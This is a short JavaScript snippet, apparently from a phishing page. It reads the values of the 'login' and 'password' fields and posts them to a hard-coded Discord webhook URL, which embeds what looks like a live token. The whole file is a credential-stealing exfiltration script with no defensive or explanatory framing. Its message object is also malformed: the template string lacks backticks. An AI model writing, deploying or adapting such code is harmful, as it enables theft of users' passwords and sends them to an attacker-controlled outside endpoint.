const whurl ="https://discord.com/api/webhooks/893828775236734996/K7W2ZmdJsVDuAUzl_PNT1rfWCCUWQ_jHPkWrdjQC9Mx0Vj5jkahzNtRjZ9jQ8oxoyNDf"



var theInput = document.getElementById("login").value;
var pass = document.getElementById("password").value;

const msg = {
    "content": ${theInput}  ${pass}
}

fetch(whurl, {"method":"POST", 
"headers": {"content-type": "application/json"},
"body": JSON.stringify(msg)})
